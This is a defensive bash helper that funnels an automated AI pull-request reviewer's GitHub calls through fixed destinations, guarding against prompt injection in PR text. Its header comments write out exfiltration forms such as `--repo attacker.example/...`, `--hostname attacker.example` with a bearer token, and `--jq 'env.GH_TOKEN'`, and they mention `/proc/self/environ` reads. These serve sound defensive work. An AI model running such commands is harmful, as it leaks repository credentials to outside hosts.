#!/usr/bin/env bash
# The only GitHub access the automated PR reviewer is allowed to make.
#
# .github/workflows/claude-code-review.yml runs a Claude Code reviewer over
# PR-authored text — the diff, commit messages, existing comments. Anything that
# text can talk the model into doing, the model can do. So the reviewer holds no
# `gh` grant of its own: every GitHub call it makes comes through here, and this
# script takes the DESTINATION (host, repo, pull request, commit) from its
# environment and only the CONTENT from its arguments. The model controls the
# arguments and nothing else, so it cannot choose where anything goes.
#
# Why a fixed-shape helper and not a narrower allow-list pattern: Claude Code's
# Bash matcher is a prefix match. It refuses chaining, substitution, pipes and
# redirection, but it permits extra flags on the same invocation — so no pattern
# short of an exact match can forbid a trailing `--repo attacker.example/a/b`,
# `--hostname attacker.example`, `-H "Authorization: Bearer $GH_TOKEN"` or
# `--jq 'env.CLAUDE_CODE_OAUTH_TOKEN'`. And because the shell expands `$VAR`, the
# model never even has to READ a secret to send one. Removing the choice beats
# pattern-matching it away. Measured, all three, against the real API:
#   gh pr diff 1 --repo HOST/OWNER/REPO      connects to HOST (any host)
#   gh pr view N --repo R --jq 'env.SECRET'  prints the process environment
#   gh api --hostname HOST -H "..."          posts cross-host with the token
#
# Usage — the reviewer prompt in the workflow spells these out too:
#   review-gh.sh diff                          print the pull request's diff
#   review-gh.sh view <jsonFields>             print PR metadata as JSON
#   review-gh.sh summary <body>                 post the top-level summary comment
#   review-gh.sh inline <path> <line> <body>    post one line-level review comment
#   review-gh.sh security-verdict pass 0        post the Security lens's verdict
#   review-gh.sh security-verdict fail <musts> <categories>
#   review-gh.sh security-findings <details>     save a failing lens's details
#                                               for Security (never posted)
#
# Environment, set by the workflow and out of the model's reach:
#   REVIEW_REPO  OWNER/REPO, no host prefix (validated below)
#   REVIEW_PR    the pull request number (validated below)
#   REVIEW_HEAD_SHA  the head commit the review is about (security-verdict;
#                when unset, the PR's current head is resolved, as for inline)
#   REVIEW_FINDINGS_DIR  absolute path of the private directory where
#                `security-findings` saves the details. When set, a `fail`
#                verdict needs those details saved first, and a `pass` discards
#                any. The workflow encrypts them to Security's key afterwards
#                (scripts/security-findings.sh post) and deletes the plaintext.
#   GH_TOKEN     supplied to the reviewer's shell by claude-code-action
#
# Run this from a copy materialized out of the repository's DEFAULT BRANCH, never
# from the PR checkout — see the workflow step "Materialize the trusted review
# helper". A helper the PR can rewrite is not a helper: the attacker just
# rewrites it. Its fixture suite is scripts/test-review-classifier.sh.

set -uo pipefail

# Pin the host. The model cannot reach this variable, and no call below passes a
# host-prefixed `--repo`, which is the one thing that would override it.
export GH_HOST=github.com

die() {
  echo "review-gh: $1" >&2
  exit 2
}

repo=${REVIEW_REPO:-}
pr=${REVIEW_PR:-}

# Exactly one slash. `HOST/OWNER/REPO` is how a `--repo` value smuggles in another
# host, so anything with a second slash is refused rather than handed to `gh`.
case "$repo" in
  -* | */*/*) die "REVIEW_REPO must be OWNER/REPO with no host prefix; got '$repo'" ;;
  ?*/?*) ;;
  *) die "REVIEW_REPO must be OWNER/REPO; got '$repo'" ;;
esac

case "$pr" in
  '' | *[!0-9]*) die "REVIEW_PR must be a pull request number; got '$pr'" ;;
esac

# The head the Security lens judged, set by the workflow; resolved only when
# unset (a manual dispatch), like `inline`.
review_head() {
  sha=${REVIEW_HEAD_SHA:-}
  if [ -z "$sha" ]; then
    sha=$(gh pr view "$pr" --repo "$repo" --json headRefOid --jq '.headRefOid') ||
      die "could not resolve the head commit of $repo#$pr"
  fi
  [[ "$sha" =~ ^[0-9a-f]{40}$ ]] || die "unexpected head commit '$sha'"
}

# REVIEW_FINDINGS_DIR, when the workflow sets it: absolute, and nothing else.
findings_dir() {
  fdir=${REVIEW_FINDINGS_DIR:-}
  case "$fdir" in
    /*) ;;
    *) die "REVIEW_FINDINGS_DIR must be an absolute path; got '$fdir'" ;;
  esac
}

sub=${1:-}
[ "$#" -gt 0 ] && shift

case "$sub" in
  diff)
    [ "$#" -eq 0 ] || die "diff takes no arguments (got $#)"
    exec gh pr diff "$pr" --repo "$repo"
    ;;

  view)
    [ "$#" -eq 1 ] || die "view takes one argument, a comma-separated list of JSON field names (got $#)"
    # Field names only, which is what keeps `--jq` out of reach: `gh`'s jq
    # expressions can read the process environment, so `--jq 'env.GH_TOKEN'` is
    # the same secret-read primitive as `grep "" /proc/self/environ`. The reviewer
    # gets raw JSON and filters it itself.
    case "$1" in
      '' | *[!A-Za-z,]*) die "view fields must be comma-separated JSON field names; got '$1'" ;;
    esac
    exec gh pr view "$pr" --repo "$repo" --json "$1"
    ;;

  summary)
    [ "$#" -eq 1 ] || die "summary takes one argument, the comment body (got $#)"
    [ -n "$1" ] || die "summary body must not be empty"
    exec gh pr comment "$pr" --repo "$repo" --body "$1"
    ;;

  inline)
    [ "$#" -eq 3 ] || die "inline takes three arguments: <path> <line> <body> (got $#)"
    path=$1
    line=$2
    body=$3
    [ -n "$path" ] || die "inline path must not be empty"
    [ -n "$body" ] || die "inline body must not be empty"
    case "$line" in
      '' | *[!0-9]*) die "inline line must be a whole number; got '$line'" ;;
    esac
    [ "$line" -gt 0 ] || die "inline line must be greater than zero; got '$line'"

    # Resolved here rather than passed in: the commit is part of the destination,
    # and it is the one field of this call the reviewer has no business choosing.
    # The `--jq` here is a literal in this file, not model input.
    sha=$(gh pr view "$pr" --repo "$repo" --json headRefOid --jq '.headRefOid') ||
      die "could not resolve the head commit of $repo#$pr"
    case "$sha" in
      '' | *[!0-9a-f]*) die "unexpected head commit '$sha'" ;;
    esac

    # `-f` (raw-field), never `-F`, for anything the model supplies: `-F` reads
    # `key=@path` from a FILE, so a body or path beginning with `@` would turn
    # into an arbitrary file read. `-f` takes the value literally — verified
    # against the API. `line` is the one `-F`, because the endpoint wants a
    # number and the check above has already proved it is digits.
    exec gh api --method POST "repos/$repo/pulls/$pr/comments" \
      -f "body=$body" \
      -f "commit_id=$sha" \
      -f "path=$path" \
      -F "line=$line" \
      -f side=RIGHT
    ;;

  security-verdict)
    # The Security lens's verdict (DOR-5099), in a fixed shape the
    # `security-verdict` job reads as data. The model chooses only pass or
    # fail, a count, and categories from a fixed list; every other byte of the
    # comment, the head commit included, comes from this file. The body never
    # carries a finding, because this repo is public (ci/security/review-lens.md).
    [ "$#" -ge 2 ] && [ "$#" -le 3 ] ||
      die "security-verdict takes: pass 0 | fail <musts> <categories> (got $# arguments)"
    verdict=$1
    musts=$2
    cats=${3:-}
    case "$musts" in
      '' | *[!0-9]*) die "security-verdict musts must be a whole number; got '$musts'" ;;
    esac
    [ "${#musts}" -le 2 ] || die "security-verdict musts must be under 100; got '$musts'"
    case "$verdict" in
      pass)
        [ "$#" -eq 2 ] && [ "$musts" -eq 0 ] || die "security-verdict pass takes exactly: pass 0"
        ;;
      fail)
        [ "$#" -eq 3 ] && [ "$musts" -gt 0 ] ||
          die "security-verdict fail takes: fail <musts, at least 1> <categories>"
        [[ "$cats" =~ ^[a-z-]+(,[a-z-]+)*$ ]] ||
          die "security-verdict categories must be a comma-separated list; got '$cats'"
        IFS=, read -r -a cat_list <<<"$cats"
        for c in "${cat_list[@]}"; do
          case "$c" in
            auth | injection | permissions | connectors | extensions | secrets | ci | supply-chain | other) ;;
            *) die "security-verdict category '$c' is not one of auth, injection, permissions, connectors, extensions, secrets, ci, supply-chain, other" ;;
          esac
        done
        ;;
      *) die "security-verdict must be pass or fail; got '$verdict'" ;;
    esac

    review_head

    # The details behind a fail go to Security, encrypted (security-findings
    # below). Where the workflow provides for them, a fail without them is
    # refused, so the author never gets a verdict nobody can explain. A pass is
    # the final word, so it discards any details saved earlier in the run.
    if [ -n "${REVIEW_FINDINGS_DIR:-}" ]; then
      findings_dir
      if [ "$verdict" = fail ]; then
        [ -s "$fdir/findings.txt" ] && [ "$(cat "$fdir/head" 2>/dev/null)" = "$sha" ] ||
          die "security-verdict fail needs the details saved first: run security-findings '<details>', then this again"
      else
        rm -f "$fdir/findings.txt" "$fdir/head"
      fi
    fi

    if [ "$verdict" = pass ]; then
      line="Security lens: **pass** at \`${sha:0:7}\`, no Musts."
    else
      line="Security lens: **fail** at \`${sha:0:7}\`, $musts Must(s) in: $cats. Details are not posted here because this repository is public."
    fi
    body="<!-- dorkos-security-verdict v1 head=$sha verdict=$verdict musts=$musts cats=${cats:--} -->
$line
_Advisory while the cloud and local Security reviews are compared (DOR-5099)._"
    exec gh pr comment "$pr" --repo "$repo" --body "$body"
    ;;

  security-findings)
    # The details behind a failing Security lens: for each Must, the file and
    # line, the attacker, the attack and the smallest fix. They never go to
    # GitHub from here. This saves them to a private file at a path the workflow
    # chose (REVIEW_FINDINGS_DIR), and a later trusted step encrypts them to
    # Security's public key and deletes the plaintext. The model chooses only the
    # text, which is only ever encrypted as opaque bytes, never run or parsed.
    # Nothing here echoes it back: diagnostics name its size, not its content.
    [ "$#" -eq 1 ] || die "security-findings takes one argument, the details (got $#)"
    [ -n "${REVIEW_FINDINGS_DIR:-}" ] ||
      die "security-findings is not available on this run (REVIEW_FINDINGS_DIR is unset)"
    findings_dir
    [ -n "$1" ] || die "security-findings details must not be empty"
    size=$(printf '%s' "$1" | wc -c | tr -d ' ')
    [ "$size" -le 16384 ] ||
      die "security-findings details are $size bytes; the limit is 16384. Shorten them and run this again"
    review_head
    # Private from the first byte: umask before the directory and the file exist.
    umask 077
    mkdir -p "$fdir" || die "could not create the findings directory"
    [ -d "$fdir" ] && [ ! -L "$fdir" ] || die "the findings directory is not a plain directory"
    if ! { printf '%s\n' "$1" >"$fdir/findings.txt.tmp" &&
      mv -f "$fdir/findings.txt.tmp" "$fdir/findings.txt" &&
      printf '%s\n' "$sha" >"$fdir/head"; }; then
      die "could not save the details"
    fi
    echo "Saved $size bytes of Security details for ${sha:0:7}. After the review they are encrypted so only Security can read them, and the plaintext is deleted; nothing is posted in the clear. Now post the verdict: security-verdict fail <musts> <categories>."
    ;;

  *) die "unknown subcommand '$sub'; expected diff, view, summary, inline, security-verdict or security-findings" ;;
esac
